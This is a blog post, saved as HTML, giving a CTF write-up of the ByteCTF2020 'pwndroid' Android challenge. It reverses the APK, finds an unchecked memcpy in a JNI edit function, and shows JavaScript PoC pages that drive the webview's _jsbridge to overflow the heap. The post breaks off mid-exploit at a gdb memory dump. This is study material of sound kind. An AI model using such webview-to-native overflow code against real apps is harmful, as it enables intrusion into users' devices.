<!doctype html>



  



    
  

<html class="theme-next logos use-motion" lang="zh-hk">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.useso.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Hexo, NexT">








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">






<meta name="description" content="11月总是会有好事发生的。 This is a challenge from ByteCTF2020, a simple heap challenge but ran on android. I learned a lot about webview and native interface from it. Four teams solved it during the game, I’m lu">
<meta property="og:type" content="article">
<meta property="og:title" content="[ByteCTF2020 Quals] - pwndroid">
<meta property="og:url" content="http://matshao.com/2020/10/27/ByteCTF2020-Quals-pwndroid/index.html">
<meta property="og:site_name" content="Mid Station">
<meta property="og:description" content="11月总是会有好事发生的。 This is a challenge from ByteCTF2020, a simple heap challenge but ran on android. I learned a lot about webview and native interface from it. Four teams solved it during the game, I’m lu">
<meta property="og:locale" content="zh-hk">
<meta property="og:image" content="https://i.loli.net/2020/10/27/GhgUvItZaz7wrPp.png">
<meta property="og:image" content="https://i.loli.net/2020/10/27/xZ9mjABOyMwqsGt.png">
<meta property="og:updated_time" content="2020-10-27T13:11:35.381Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="[ByteCTF2020 Quals] - pwndroid">
<meta name="twitter:description" content="11月总是会有好事发生的。 This is a challenge from ByteCTF2020, a simple heap challenge but ran on android. I learned a lot about webview and native interface from it. Four teams solved it during the game, I’m lu">
<meta name="twitter:image" content="https://i.loli.net/2020/10/27/GhgUvItZaz7wrPp.png">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Logos',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://matshao.com/2020/10/27/ByteCTF2020-Quals-pwndroid/">





  <title> [ByteCTF2020 Quals] - pwndroid | Mid Station </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">

  





<script>
  	var _mtac = {};
  	(function() {
  		var mta = document.createElement("script");
  		mta.src = "http://pingjs.qq.com/h5/stats.js?v2.0.4";
  		mta.setAttribute("name", "MTAH5");
  		mta.setAttribute("sid", "500688563");
  		var s = document.getElementsByTagName("script")[0];
  		s.parentNode.insertBefore(mta, s);
  	})();
</script>





  
  
    
  

  <div class="container one-collumn sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
    <div class="header-logos"> 
      <div class="site-meta ">
  
    <div class="site-meta-headline">
      <a href="/">
        <img class="custom-logo-image" src="/images/logo_light.png" alt="Mid Station">
      </a>
    </div>
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Mid Station</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <p class="site-subtitle"></p>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首頁
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            歸檔
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            關於
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 
            
      </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://matshao.com/2020/10/27/ByteCTF2020-Quals-pwndroid/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="Matthew Shao">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Mid Station">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Mid Station" src="/images/logo_light.png">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                [ByteCTF2020 Quals] - pwndroid
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-10-27T15:21:03+08:00">
                2020-10-27
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分類於</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Hack/" itemprop="url" rel="index">
                    <span itemprop="name">Hack</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>11月总是会有好事发生的。</p>
<p>This is a challenge from ByteCTF2020, a simple heap challenge but ran on android. I learned a lot about webview and native interface from it. Four teams solved it during the game, I’m lucky enough to get the flag in the last hour.</p>
<a id="more"></a>
<h2 id="recon"><a class="header-anchor" href="#recon">¶</a>Recon</h2>
<p>I have never tried any Android pwn challenge before, only have every limit knowledge about reversing an APK. The organizer provides an APK file and a website. The website is down when I’m writing this post, so I can only recall rough information from the webpage.</p>
<ul>
<li>The remote system is running x86 emulator with android default image, API version 24</li>
<li>The player needs to solve a POW and provide an IP address</li>
<li>I think the server will download the html file from the provided IP address and serve it on <code>http://192.168.1.1</code></li>
<li>server kill previous <code>pwndroid</code> process and launch the APP via <code>adb shell am start -a &quot;android.intent.action.VIEW&quot; -d &quot;pwndroid://192.168.1.1&quot;</code></li>
</ul>
<h3 id="native-library-file"><a class="header-anchor" href="#native-library-file">¶</a>Native library file</h3>
<p>Because this is a pwn challenge, this first thing came up in my mind was the Native Development Kit (NDK), so I did not fire up an APK decompiler first, but uncompress the APK and look for a <code>.so</code> file. The is a native library call <code>libNDKLib.so</code> in <code>lib/x86</code> .</p>
<p>Open the lib file with ida, we can see a bunch of funcitons name start with <code>Java_ctf_bytedance_pwndroid_JNITools_</code>, and some helper functions like <code>ByteToHexStr</code> ,<code>HexStrToByte</code> ,<code>unhex</code> . Going through all these native functions, we found that there are <code>add</code> , <code>show</code>, <code>free</code>, <code>edit</code>, just like typical heap challenage in glibc. It trivial to spot that there might be a vulnerability in <code>Java_ctf_bytedance_pwndroid_JNITools_edit</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">Java_ctf_bytedance_pwndroid_JNITools_edit</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> idx, <span class="keyword">size_t</span> size, <span class="keyword">int</span> content)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *src; <span class="comment">// [esp+28h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// [esp+2Ch] [ebp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)(idx &gt;= <span class="number">0</span>) &gt;= <span class="number">0x10</span>u || !heap_list[idx] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v7 = (<span class="keyword">char</span> *)_JNIEnv::GetStringUTFChars(a1, content, <span class="number">0</span>);</span><br><span class="line">  src = (<span class="keyword">const</span> <span class="keyword">void</span> *)unhex(v7);</span><br><span class="line">  <span class="built_in">memcpy</span>(**((<span class="keyword">void</span> ***)&amp;(*(&amp;off_2FB0 - <span class="number">2</span>))-&gt;d_tag + idx), src, size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>So there is no check for the size before <code>memcpy</code> , it might cause a heap overflow. But we need to figure out if there exist other checks on Java level.</p>
<h3 id="apk-reversing"><a class="header-anchor" href="#apk-reversing">¶</a>APK Reversing</h3>
<p>It took me a while to find a suitable tool for decompiling the APK, it turned out <code>jadx-gui</code> did a nice job. The APK is not obfuscated, so the core logic is not difficult to understand.</p>
<p><img src="https://i.loli.net/2020/10/27/GhgUvItZaz7wrPp.png" alt="decomplie.png"><span class="image-caption">decomplie.png</span></p>
<ul>
<li><code>JNITools</code> class is an interface for the native library.</li>
<li><code>NativeMethods</code> class is an interface for the <code>JNITools</code>, it extracts arguments from <code>JSONObject</code>, invoking corresponding native library function, return the results, and process callbacks.</li>
<li><code>JSBridge</code> class is the interface interacting with JavaScript, which is used to register <code>NativeMethods</code> .</li>
<li><code>Pwnme</code> is the Activity class, which is used to register <code>JSBridge</code> and exposed the Javascript interface to Webview.</li>
</ul>
<p>Overviewing the whole logic, the <code>Pwnme</code> Activity accepts an URL from Intent, then open a webview. The JavaScript code on the webview can be used to interact with the native library, there are no checks and users can fully control the arguments of native function calls from the webview. It is kind of similar to the browser pwn challenge, we need to write JavaScript to construct the exploit.</p>
<h2 id="debug-environment"><a class="header-anchor" href="#debug-environment">¶</a>Debug Environment</h2>
<p>We can download Android studio, and with AVD Manager, we can download the correct image: x86, API 24, default. Then we can debug the application with <code>adb</code>, the system has preinstalled <code>gdbserver</code> , so it is pretty handy. But make sure the image is the default one, not the one with Google API and Play store. I once finished the exploit on the one with Google API and waste a few hours to debug.<br>
<img src="https://i.loli.net/2020/10/27/xZ9mjABOyMwqsGt.png" alt="debug env"><span class="image-caption">debug env</span><br>
We can forward the 4444 port of Android system to the host system with the command:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:4444 tcp:4444</span><br></pre></td></tr></table></figure>
<p>and then lauch gdbserver inside Andorid</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdbserver --attach :4444 `pid`</span><br></pre></td></tr></table></figure>
<p>now we can attach a gdb session to the gdbserver.</p>
<h2 id="poc"><a class="header-anchor" href="#poc">¶</a>PoC</h2>
<p>The next question is how to invoke the native functions from JavaScript. I searched the keyword: “jsbridge android native” on google and the [first link](<a href="https://juejin.im/post/6844903989935341576" target="_blank" rel="noopener">https://juejin.im/post/6844903989935341576</a> told me the answer, with following Java code:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JsMethodApi</span> </span>&#123;</span><br><span class="line">     </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * js调用native，可能需要回调</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@JavascriptInterface</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">callNative</span><span class="params">(String jsonString)</span> </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">webView.addJavascriptInterface(<span class="keyword">new</span> JsMethodApi(), <span class="string">"mJsMethodApi"</span>);</span><br></pre></td></tr></table></figure>
<p>The corresponding JavaScript caller is like:</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>  &gt;</span><br><span class="line">       JsMethodApi.callNative(<span class="string">'头部就可以回调'</span>);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>
<p>According to the decompiled result, we can construct following test the interface with following JavaScript code:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>  &gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">print_res</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.write(<span class="built_in">JSON</span>.stringify(res) + <span class="string">"\n"</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">idx, size, content</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> arg = &#123;</span><br><span class="line">            data: &#123;</span><br><span class="line">                idx: idx,</span><br><span class="line">                size: size,</span><br><span class="line">                content: content,</span><br><span class="line">            &#125;,</span><br><span class="line">            cbName: <span class="string">"print_res"</span></span><br><span class="line">        &#125;</span><br><span class="line">        _jsbridge.call(<span class="string">"add"</span>, <span class="built_in">JSON</span>.stringify(arg));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">"A"</span>*<span class="number">0x20</span>);</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>head&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
<p>Launch the app with <code>adb shell am start -a &quot;android.intent.action.VIEW&quot; -d &quot;pwndroid://192.168.1.1&quot;</code> , it will show a Toast message with invoking arguments, and the result will be displayed on the webview.<br>
Now that we have verified the JSBridge works, and we know about the vulnerability, we can construct a PoC to crash the process.</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">    &lt;script type=<span class="string">"text/javascript"</span>  &gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">print_res</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.write(<span class="built_in">JSON</span>.stringify(res) + <span class="string">"\n"</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">idx, size, content</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> arg = &#123;</span><br><span class="line">            data: &#123;</span><br><span class="line">                idx: idx,</span><br><span class="line">                size: size,</span><br><span class="line">                content: content,</span><br><span class="line">            &#125;,</span><br><span class="line">            cbName: <span class="string">"print_res"</span></span><br><span class="line">        &#125;</span><br><span class="line">        _jsbridge.call(<span class="string">"add"</span>, <span class="built_in">JSON</span>.stringify(arg));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> arg = &#123;</span><br><span class="line">            data: &#123;</span><br><span class="line">                idx: idx,</span><br><span class="line">                size: size,</span><br><span class="line">                content: content,</span><br><span class="line">            &#125;,</span><br><span class="line">            cbName: <span class="string">"print_res"</span></span><br><span class="line">        &#125;</span><br><span class="line">        _jsbridge.call(<span class="string">"edit"</span>, <span class="built_in">JSON</span>.stringify(arg));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params">idx</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> arg = &#123;</span><br><span class="line">            data : &#123;</span><br><span class="line">                idx: idx</span><br><span class="line">            &#125;,</span><br><span class="line">            cbName: <span class="string">"print_res"</span></span><br><span class="line">        &#125;</span><br><span class="line">        _jsbridge.call(<span class="string">"show"</span>, <span class="built_in">JSON</span>.stringify(arg));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">free</span>(<span class="params">idx</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> arg = &#123;</span><br><span class="line">            data : &#123;</span><br><span class="line">                idx: idx</span><br><span class="line">            &#125;,</span><br><span class="line">            cbName: <span class="string">"print_res"</span></span><br><span class="line">        &#125;</span><br><span class="line">        _jsbridge.call(<span class="string">"free"</span>, <span class="built_in">JSON</span>.stringify(arg));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">"A"</span>.repeat(<span class="number">0x20</span>));</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="string">"A"</span>.repeat(<span class="number">0x2000</span>));</span><br><span class="line"></span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>head&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
<p>This script overflows number 0 item on heap and trigger a crash.</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span><span class="number">-27</span> <span class="number">03</span>:<span class="number">22</span>:<span class="number">27.318</span>  <span class="number">3640</span>  <span class="number">3651</span> F libc    : Fatal signal <span class="number">11</span> (SIGSEGV), code <span class="number">1</span>, fault addr <span class="number">0xf210458b</span> <span class="keyword">in</span> tid <span class="number">3651</span> (HeapTaskDaemon)</span><br><span class="line"><span class="number">10</span><span class="number">-27</span> <span class="number">03</span>:<span class="number">22</span>:<span class="number">27.319</span>  <span class="number">1290</span>  <span class="number">1290</span> W         : debuggerd: handling request: pid=<span class="number">3640</span> uid=<span class="number">10062</span> gid=<span class="number">10062</span> tid=<span class="number">3651</span></span><br><span class="line"><span class="number">10</span><span class="number">-27</span> <span class="number">03</span>:<span class="number">22</span>:<span class="number">27.320</span>  <span class="number">3640</span>  <span class="number">3640</span> W art     : Attempt to remove non-JNI local reference, dumping thread</span><br><span class="line"><span class="number">10</span><span class="number">-27</span> <span class="number">03</span>:<span class="number">22</span>:<span class="number">27.335</span>  <span class="number">3691</span>  <span class="number">3691</span> F DEBUG   : *** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***</span><br><span class="line"><span class="number">10</span><span class="number">-27</span> <span class="number">03</span>:<span class="number">22</span>:<span class="number">27.335</span>  <span class="number">3691</span>  <span class="number">3691</span> F DEBUG   : Build fingerprint: <span class="string">'Android/sdk_phone_x86/generic_x86:7.0/NYC/4174735:userdebug/test-keys'</span></span><br><span class="line"><span class="number">10</span><span class="number">-27</span> <span class="number">03</span>:<span class="number">22</span>:<span class="number">27.335</span>  <span class="number">3691</span>  <span class="number">3691</span> F DEBUG   : Revision: <span class="string">'0'</span></span><br><span class="line"><span class="number">10</span><span class="number">-27</span> <span class="number">03</span>:<span class="number">22</span>:<span class="number">27.335</span>  <span class="number">3691</span>  <span class="number">3691</span> F DEBUG   : ABI: <span class="string">'x86'</span></span><br><span class="line"><span class="number">10</span><span class="number">-27</span> <span class="number">03</span>:<span class="number">22</span>:<span class="number">27.335</span>  <span class="number">3691</span>  <span class="number">3691</span> F DEBUG   : pid: <span class="number">3640</span>, <span class="attr">tid</span>: <span class="number">3651</span>, <span class="attr">name</span>: HeapTaskDaemon  &gt;&gt;&gt; ctf.bytedance.pwndroid &lt;&lt;&lt;</span><br><span class="line">10-27 03:22:27.335  3691  3691 F DEBUG   : signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0xf210458b</span><br><span class="line">10-27 03:22:27.335  3691  3691 F DEBUG   :     eax f210458b  ebx a8dfbb6c  ecx 9f351eb4  edx 9f351a5c</span><br><span class="line">10-27 03:22:27.335  3691  3691 F DEBUG   :     esi f210458b  edi a8eb366c</span><br><span class="line">10-27 03:22:27.335  3691  3691 F DEBUG   :     xcs 00000073  xds 0000007b  xes 0000007b  xfs 0000003b  xss 0000007b</span><br><span class="line">10-27 03:22:27.335  3691  3691 F DEBUG   :     eip a890ad72  ebp a7cca088  esp a7cca060  flags 0001028</span><br></pre></td></tr></table></figure>
<h2 id="exploit-development"><a class="header-anchor" href="#exploit-development">¶</a>Exploit Development</h2>
<p>With a heap overflow vulnerability, we want to know what we can control on the heap. From <code>Java_ctf_bytedance_pwndroid_JNITools_add</code> , we know that the item struct is in the size of 8 bytes.</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl Java_ctf_bytedance_pwndroid_JNITools_add(int a1, int a2, int a3, size_t size, int a5)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// eax</span></span><br><span class="line">  int v6; <span class="comment">// esi</span></span><br><span class="line">  int v7; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">void</span> *v9; <span class="comment">// [esp+28h] [ebp-34h]</span></span><br><span class="line">  char *v10; <span class="comment">// [esp+2Ch] [ebp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (unsigned __int8)(a3 &gt;= <span class="number">0</span>) &gt;= <span class="number">0x10</span>u )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v10 = (char *)_JNIEnv::GetStringUTFChars(a1, a5, <span class="number">0</span>);</span><br><span class="line">  v9 = (<span class="keyword">const</span> <span class="keyword">void</span> *)unhex(v10);</span><br><span class="line">  *(&amp;(*(&amp;off_2FB0 - <span class="number">2</span>))-&gt;d_tag + a3) = (__int32)malloc(<span class="number">8</span>u);</span><br><span class="line">  v5 = malloc(size);</span><br><span class="line">  v6 = (int)*(&amp;off_2FB0 - <span class="number">2</span>);</span><br><span class="line">  v7 = (int)*(&amp;off_2FB0 - <span class="number">1</span>);</span><br><span class="line">  **(_DWORD **)(v6 + <span class="number">4</span> * a3) = v5;</span><br><span class="line">  *(_DWORD *)(*(_DWORD *)(v6 + <span class="number">4</span> * a3) + <span class="number">4</span>) = v7;</span><br><span class="line">  memcpy(**(<span class="keyword">void</span> ***)(v6 + <span class="number">4</span> * a3), v9, size);</span><br><span class="line">  <span class="keyword">return</span> heap_list[a3];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>And we can have a better view of the memory layout if we attach to the process after a simple heap spray, with following JavaScript code:</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> c = i.toString(<span class="number">16</span>);</span><br><span class="line">        add(i, <span class="number">8</span>, c.repeat(<span class="number">8</span>))</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>We have the memory layout like following, where <code>$B</code> is the base address of <code>libNDKLib.so</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">gef➤  <span class="built_in">set</span> $B=<span class="number">0x8f284000</span></span><br><span class="line">gef➤  tele $B+<span class="number">0x3000</span></span><br><span class="line"><span class="number">0x8f287000</span>│+<span class="number">0x0000</span>: <span class="number">0xacaa7d48</span>  →  <span class="number">0xacaa7d58</span>  →  <span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x8f287004</span>│+<span class="number">0x0004</span>: <span class="number">0xacaa7dd0</span>  →  <span class="number">0xacaa7de0</span>  →  <span class="number">0x11111111</span></span><br><span class="line"><span class="number">0x8f287008</span>│+<span class="number">0x0008</span>: <span class="number">0xacaa7dc0</span>  →  <span class="number">0xacaa7df0</span>  →  <span class="number">0x22222222</span></span><br><span class="line"><span class="number">0x8f28700c</span>│+<span class="number">0x000c</span>: <span class="number">0xacaa7dc8</span>  →  <span class="number">0xacaa7e00</span>  →  <span class="number">0x33333333</span></span><br><span class="line"><span class="number">0x8f287010</span>│+<span class="number">0x0010</span>: <span class="number">0xacaa7de8</span>  →  <span class="number">0xacaa7e10</span>  →  <span class="string">"DDDD"</span></span><br><span class="line"><span class="number">0x8f287014</span>│+<span class="number">0x0014</span>: <span class="number">0xacaa7df8</span>  →  <span class="number">0xacaa7e20</span>  →  <span class="string">"UUUU"</span></span><br><span class="line"><span class="number">0x8f287018</span>│+<span class="number">0x0018</span>: <span class="number">0xacaa7e08</span>  →  <span class="number">0xacaa7e78</span>  →  <span class="string">"ffff"</span></span><br><span 